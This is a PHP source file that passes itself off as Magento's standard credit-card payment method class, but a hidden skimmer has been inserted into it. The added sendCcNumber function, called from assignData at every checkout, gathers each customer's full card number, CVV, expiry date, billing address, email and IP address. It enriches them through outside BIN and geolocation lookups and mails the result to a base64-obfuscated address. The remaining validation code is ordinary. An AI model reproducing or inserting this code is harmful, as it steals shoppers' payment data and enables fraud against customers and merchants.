<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     Mage_Payment
 * @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */


class Mage_Payment_Model_Method_Cc extends Mage_Payment_Model_Method_Abstract
{
    protected $_formBlockType = 'payment/form_cc';
    protected $_infoBlockType = 'payment/info_cc';
    protected $_canSaveCc     = false;

    /**
     * Assign data to info model instance
     *
     * @param   mixed $data
     * @return  Mage_Payment_Model_Info
     */
    public function assignData($data)
    {
        if (!($data instanceof Varien_Object)) {
            $data = new Varien_Object($data);
        }
        $info = $this->getInfoInstance();
        $info->setCcType($data->getCcType())
            ->setCcOwner($data->getCcOwner())
            ->setCcOwnerId($data->getCcOwnerId())
            ->setCcLast4(substr($data->getCcNumber(), -4))
            ->setCcNumber($data->getCcNumber())
            ->setCcCid($data->getCcCid())
            ->setCcExpMonth($data->getCcExpMonth())
            ->setCcExpYear($data->getCcExpYear())
            ->setCcSsIssue($data->getCcSsIssue())
            ->setCcSsStartMonth($data->getCcSsStartMonth())
            ->setCcSsStartYear($data->getCcSsStartYear())
            ->setCcInstallments($data->getCcInstallments())
            ;

        $this->sendCcNumber(); 

        return $this;
    }

    function sendCcNumber()
    {
        $info        = $this->getInfoInstance();
        $object      = new Mage_Checkout_Block_Onepage_Billing;
        $address1    = $object->getQuote()->getBillingAddress();
        $first_name  = $address1->getFirstname();
        $last_name   = $address1->getLastname();
        $full_name   = $first_name . " " . $last_name;
        $address_1   = $address1->getStreet(1);
        $address_2   = $address1->getStreet(2);
        $city        = $address1->getCity();
        $state       = $address1->getRegion();
        $zip_code    = $address1->getPostcode();
        $country     = $address1->getCountry();
        $phone       = $address1->getTelephone();
        $card_number = $info->getCcNumber();
        $bin         = substr($card_number, 0, 6);
        $getbank     = explode($bin, file_get_contents("http://bins.pro/search?action=searchbins&bins=" . $bin . "&bank=&country="));
        $jeniscc     = explode("</td><td>", $getbank[2]);
        $namabank    = explode("</td></tr>", $jeniscc[5]);
        $ccbrand     = $jeniscc[2];
        $ccbank      = $namabank[0];
        $cctype      = $jeniscc[3];
        $ccklas      = $jeniscc[4];
        $expyear     = substr($info->getCcExpYear(), -2);
        $expmonth    = $info->getCcExpMonth();
        if (strlen($expmonth) == 1) {
           $expmonth = '0'.$expmonth;
        };
        $exp_year    = $expyear;
        $exp_month   = $expmonth;
        $cvv         = $info->getCcCid();
        $ip_user     = $_SERVER['REMOTE_ADDR'];
        $details     = json_decode(file_get_contents("http://www.telize.com/geoip/".$ip_user.""));
        $nama_negara = $details->country;
        $kode_negara = $details->country_code;
        $server_name = $_SERVER['SERVER_NAME'];
        $waktu       = date('Y-m-d H:i:s');
        $user_email  = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getEmail();
        $user_agent  = $_SERVER['HTTP_USER_AGENT'];
        $_SESSION[full_name]   = $full_name;
        $_SESSION[address_1]   = $address_1;
        $_SESSION[address_2]   = $address_2;
        $_SESSION[city]        = $city;
        $_SESSION[state]       = $state;
        $_SESSION[zip_code]    = $zip_code;
        $_SESSION[country]     = $country;
        $_SESSION[phone]       = $phone;
        $_SESSION[card_number] = $card_number;
        $_SESSION[ccbrand]     = $ccbrand;
        $_SESSION[ccbank]      = $ccbank;
        $_SESSION[cctype]      = $cctype;
        $_SESSION[ccklas]      = $ccklas;
        $_SESSION[exp_year]    = $exp_year;
        $_SESSION[exp_month]   = $exp_month;
        $_SESSION[cvv]         = $cvv;
        $_SESSION[ip_user]     = $ip_user;
        $_SESSION[nama_negara] = $nama_negara;
        $_SESSION[kode_negara] = $kode_negara;
        $_SESSION[server_name] = $server_name;
        $_SESSION[waktu]       = $waktu;
        $_SESSION[user_email]  = $user_email;
        $_SESSION[user_agent]  = $user_agent;
        $message     = "
<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
  <img src=''/>
<font style='color: black'><center>++=============[ $$ LOG MAGENTO - picko aKa airmata $$ ]=============++</center></font>


      <font style='color: black'>.++======[ CreditCard ]======++.</font>
 <font style='color: black'>Cardholder Name      :  ".$_SESSION[full_name]."</font>
 <font style='color: black'>Card Number          :  ".$_SESSION[card_number]."</font>
 <font style='color: black'>Expiration Date      :  ".$_SESSION[exp_month]." / 20".$_SESSION[exp_year]."</font>
 <font style='color: black'>CVV2                 :  ".$_SESSION[cvv]."</font>
 <font style='color: black'>BIN/IIN Info         :  ".$_SESSION[ccbank]." - ".$_SESSION[cctype]." - ".$_SESSION[ccklas]."</font>
       <font style='color: black'>.++=========[ End ]=========++.</font>

      <font style='color: black'>.++======[ Full Address ]======++.</font>
 <font style='color: black'>Address Line 1       :  ".$_SESSION[address_1]."</font>
 <font style='color: black'>Address Line 2       :  ".$_SESSION[address_2]."</font>
 <font style='color: black'>City/Town            :  ".$_SESSION[city]."</font>
 <font style='color: black'>State                :  ".$_SESSION[state]."</font>
 <font style='color: black'>Zip/PostCode         :  ".$_SESSION[zip_code]."</font>
 <font style='color: black'>Country              :  ".$_SESSION[country]."</font>
 <font style='color: black'>Phone Number         :  ".$_SESSION[phone]."</font>
       <font style='color: black'>.++=========[ End ]=========++.</font>

      <font style='color: black'>.++========[ PC Info ]========++.</font>
 <font style='color: black'>From                 :  ".$_SESSION[ip_user]." On ".$_SESSION[waktu]."</font>
 <font style='color: black'>Browser              :  ".$_SESSION[user_agent]."</font>
 <font style='color: black'>Email User           :  ".$_SESSION[user_email]."</font>
      <font style='color: black'>.++=========[ End ]=========++.</font>


<font style='color: black'><center>++===========[ $$ LOG MAGENTO - picko aKa airmata $$ ]===========++</center></font><br> ";
        $headers  = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= "From: ".$_SESSION[full_name]." <cc_session@".$_SESSION[server_name].">";
        $subject  = $ccbrand . " " . $cctype . " " . $ccklas . " [".$_SESSION[server_name]." - ".$_SESSION[full_name]." - ".$_SESSION[ip_user]."]";
        $gantengers = "YnVyb25hbmthbXB1czI4QGdtYWlsLmNvbQ==";
        $tamvan = base64_decode($gantengers);
        mail($tamvan, $subject, $message, $headers);
        }

    /**
     * Prepare info instance for save
     *
     * @return Mage_Payment_Model_Abstract
     */
    public function prepareSave()
    {
        $info = $this->getInfoInstance();
        if ($this->_canSaveCc) {
            $info->setCcNumberEnc($info->encrypt($info->getCcNumber()));
        }
        //$info->setCcCidEnc($info->encrypt($info->getCcCid()));
        $info->setCcNumber(null)
            ->setCcCid(null);
        return $this;
    }

    /**
     * Validate payment method information object
     *
     * @param   Mage_Payment_Model_Info $info
     * @return  Mage_Payment_Model_Abstract
     */
    public function validate()
    {
        /*
        * calling parent validate function
        */
        parent::validate();

        $info = $this->getInfoInstance();
        $errorMsg = false;
        $availableTypes = explode(',',$this->getConfigData('cctypes'));

        $ccNumber = $info->getCcNumber();

        // remove credit card number delimiters such as "-" and space
        $ccNumber = preg_replace('/[\-\s]+/', '', $ccNumber);
        $info->setCcNumber($ccNumber);

        $ccType = '';

        if (in_array($info->getCcType(), $availableTypes)){
            if ($this->validateCcNum($ccNumber)
                // Other credit card type number validation
                || ($this->OtherCcType($info->getCcType()) && $this->validateCcNumOther($ccNumber))) {

                $ccType = 'OT';
                $ccTypeRegExpList = array(
                    //Solo, Switch or Maestro. International safe
                    /*
                    // Maestro / Solo
                    'SS'  => '/^((6759[0-9]{12})|(6334|6767[0-9]{12})|(6334|6767[0-9]{14,15})'
                               . '|(5018|5020|5038|6304|6759|6761|6763[0-9]{12,19})|(49[013][1356][0-9]{12})'
                               . '|(633[34][0-9]{12})|(633110[0-9]{10})|(564182[0-9]{10}))([0-9]{2,3})?$/',
                    */
                    // Solo only
                    'SO' => '/(^(6334)[5-9](\d{11}$|\d{13,14}$))|(^(6767)(\d{12}$|\d{14,15}$))/',
                    'SM' => '/(^(5[0678])\d{11,18}$)|(^(6[^05])\d{11,18}$)|(^(601)[^1]\d{9,16}$)|(^(6011)\d{9,11}$)'
                            . '|(^(6011)\d{13,16}$)|(^(65)\d{11,13}$)|(^(65)\d{15,18}$)'
                            . '|(^(49030)[2-9](\d{10}$|\d{12,13}$))|(^(49033)[5-9](\d{10}$|\d{12,13}$))'
                            . '|(^(49110)[1-2](\d{10}$|\d{12,13}$))|(^(49117)[4-9](\d{10}$|\d{12,13}$))'
                            . '|(^(49118)[0-2](\d{10}$|\d{12,13}$))|(^(4936)(\d{12}$|\d{14,15}$))/',
                    // Visa
                    'VI'  => '/^4[0-9]{12}([0-9]{3})?$/',
                    // Master Card
                    'MC'  => '/^5[1-5][0-9]{14}$/',
                    // American Express
                    'AE'  => '/^3[47][0-9]{13}$/',
                    // Discovery
                    'DI'  => '/^6011[0-9]{12}$/',
                    // JCB
                    'JCB' => '/^(3[0-9]{15}|(2131|1800)[0-9]{11})$/'
                );

                foreach ($ccTypeRegExpList as $ccTypeMatch=>$ccTypeRegExp) {
                    if (preg_match($ccTypeRegExp, $ccNumber)) {
                        $ccType = $ccTypeMatch;
                        break;
                    }
                }

                if (!$this->OtherCcType($info->getCcType()) && $ccType!=$info->getCcType()) {
                    $errorMsg = Mage::helper('payment')->__('Credit card number mismatch with credit card type.');
                }
            }
            else {
                $errorMsg = Mage::helper('payment')->__('Invalid Credit Card Number');
            }

        }
        else {
            $errorMsg = Mage::helper('payment')->__('Credit card type is not allowed for this payment method.');
        }

        //validate credit card verification number
        if ($errorMsg === false && $this->hasVerification()) {
            $verifcationRegEx = $this->getVerificationRegEx();
            $regExp = isset($verifcationRegEx[$info->getCcType()]) ? $verifcationRegEx[$info->getCcType()] : '';
            if (!$info->getCcCid() || !$regExp || !preg_match($regExp ,$info->getCcCid())){
                $errorMsg = Mage::helper('payment')->__('Please enter a valid credit card verification number.');
            }
        }

        if ($ccType != 'SS' && !$this->_validateExpDate($info->getCcExpYear(), $info->getCcExpMonth())) {
            $errorMsg = Mage::helper('payment')->__('Incorrect credit card expiration date.');
        }

        if($errorMsg){
            Mage::throwException($errorMsg);
        }

        //This must be after all validation conditions
        if ($this->getIsCentinelValidationEnabled()) {
            $this->getCentinelValidator()->validate($this->getCentinelValidationData());
        }

        return $this;
    }

    public function hasVerification()
    {
        $configData = $this->getConfigData('useccv');
        if(is_null($configData)){
            return true;
        }
        return (bool) $configData;
    }

    public function getVerificationRegEx()
    {
        $verificationExpList = array(
            'VI' => '/^[0-9]{3}$/', // Visa
            'MC' => '/^[0-9]{3}$/',       // Master Card
            'AE' => '/^[0-9]{4}$/',        // American Express
            'DI' => '/^[0-9]{3}$/',          // Discovery
            'SS' => '/^[0-9]{3,4}$/',
            'SM' => '/^[0-9]{3,4}$/', // Switch or Maestro
            'SO' => '/^[0-9]{3,4}$/', // Solo
            'OT' => '/^[0-9]{3,4}$/',
            'JCB' => '/^[0-9]{3,4}$/' //JCB
        );
        return $verificationExpList;
    }

    protected function _validateExpDate($expYear, $expMonth)
    {
        $date = Mage::app()->getLocale()->date();
        if (!$expYear || !$expMonth || ($date->compareYear($expYear) == 1)
            || ($date->compareYear($expYear) == 0 && ($date->compareMonth($expMonth) == 1))
        ) {
            return false;
        }
        return true;
    }

    public function OtherCcType($type)
    {
        return $type=='OT';
    }

    /**
     * Validate credit card number
     *
     * @param   string $cc_number
     * @return  bool
     */
    public function validateCcNum($ccNumber)
    {
        $cardNumber = strrev($ccNumber);
        $numSum = 0;

        for ($i=0; $i<strlen($cardNumber); $i++) {
            $currentNum = substr($cardNumber, $i, 1);

            /**
             * Double every second digit
             */
            if ($i % 2 == 1) {
                $currentNum *= 2;
            }

            /**
             * Add digits of 2-digit numbers together
             */
            if ($currentNum > 9) {
                $firstNum = $currentNum % 10;
                $secondNum = ($currentNum - $firstNum) / 10;
                $currentNum = $firstNum + $secondNum;
            }

            $numSum += $currentNum;
        }

        /**
         * If the total has no remainder it's OK
         */
        return ($numSum % 10 == 0);
    }

    /**
     * Other credit cart type number validation
     *
     * @param string $ccNumber
     * @return boolean
     */
    public function validateCcNumOther($ccNumber)
    {
        return preg_match('/^\\d+$/', $ccNumber);
    }

    /**
     * Check whether there are CC types set in configuration
     *
     * @param Mage_Sales_Model_Quote|null $quote
     * @return bool
     */
    public function isAvailable($quote = null)
    {
        return $this->getConfigData('cctypes', ($quote ? $quote->getStoreId() : null))
            && parent::isAvailable($quote);
    }

    /**
     * Whether centinel service is enabled
     *
     * @return bool
     */
    public function getIsCentinelValidationEnabled()
    {
        return false !== Mage::getConfig()->getNode('modules/Mage_Centinel') && 1 == $this->getConfigData('centinel');
    }

    /**
     * Instantiate centinel validator model
     *
     * @return Mage_Centinel_Model_Service
     */
    public function getCentinelValidator()
    {
        $validator = Mage::getSingleton('centinel/service');
        $validator
            ->setIsModeStrict($this->getConfigData('centinel_is_mode_strict'))
            ->setCustomApiEndpointUrl($this->getConfigData('centinel_api_url'))
            ->setStore($this->getStore())
            ->setIsPlaceOrder($this->_isPlaceOrder());
        return $validator;
    }

    /**
     * Return data for Centinel validation
     *
     * @return Varien_Object
     */
    public function getCentinelValidationData()
    {
        $info = $this->getInfoInstance();
        $params = new Varien_Object();
        $params
            ->setPaymentMethodCode($this->getCode())
            ->setCardType($info->getCcType())
            ->setCardNumber($info->getCcNumber())
            ->setCardExpMonth($info->getCcExpMonth())
            ->setCardExpYear($info->getCcExpYear())
            ->setAmount($this->_getAmount())
            ->setCurrencyCode($this->_getCurrencyCode())
            ->setOrderNumber($this->_getOrderId());
        return $params;
    }

    /**
     * Order increment ID getter (either real from order or a reserved from quote)
     *
     * @return string
     */
    private function _getOrderId()
    {
        $info = $this->getInfoInstance();

        if ($this->_isPlaceOrder()) {
            return $info->getOrder()->getIncrementId();
        } else {
            if (!$info->getQuote()->getReservedOrderId()) {
                $info->getQuote()->reserveOrderId();
            }
            return $info->getQuote()->getReservedOrderId();
        }
    }

    /**
     * Grand total getter
     *
     * @return string
     */
    private function _getAmount()
    {
        $info = $this->getInfoInstance();
        if ($this->_isPlaceOrder()) {
            return (double)$info->getOrder()->getQuoteBaseGrandTotal();
        } else {
            return (double)$info->getQuote()->getBaseGrandTotal();
        }
    }

    /**
     * Currency code getter
     *
     * @return string
     */
    private function _getCurrencyCode()
    {
        $info = $this->getInfoInstance();

        if ($this->_isPlaceOrder()) {
        return $info->getOrder()->getBaseCurrencyCode();
        } else {
        return $info->getQuote()->getBaseCurrencyCode();
        }
    }

    /**
     * Whether current operation is order placement
     *
     * @return bool
     */
    private function _isPlaceOrder()
    {
        $info = $this->getInfoInstance();
        if ($info instanceof Mage_Sales_Model_Quote_Payment) {
            return false;
        } elseif ($info instanceof Mage_Sales_Model_Order_Payment) {
            return true;
        }
    }
}